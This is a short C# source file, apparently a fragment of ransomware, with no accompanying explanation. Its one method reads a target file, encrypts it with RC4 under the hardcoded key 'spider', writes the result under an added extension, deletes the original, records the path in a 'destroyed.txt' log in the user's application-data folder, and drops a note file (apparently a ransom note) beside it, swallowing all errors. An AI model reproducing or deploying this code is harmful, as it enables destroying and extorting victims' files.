using System;
using System.IO;
using System.Text;

public class key
{
	public static byte[] k = Encoding.ASCII.GetBytes("spider");

	public static void salma(string fdsfdserw, string extension)
	{
		try
		{
			byte[] fsdfdsdfds = File.ReadAllBytes(fdsfdserw);
			byte[] bytes = RC4.Encrypt(k, fsdfdsdfds);
			File.WriteAllBytes(fdsfdserw.Replace(extension, extension + main.extension), bytes);
			File.Delete(fdsfdserw);
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\destroyed.txt", fdsfdserw.Replace(extension, extension + main.extension) + Environment.NewLine);
			if (!File.Exists(Path.GetDirectoryName(fdsfdserw) + "\\" + main.textname + ".txt"))
			{
				File.AppendAllText(Path.GetDirectoryName(fdsfdserw) + "\\" + main.textname + ".txt", main.c);
			}
		}
		catch
		{
		}
	}
}
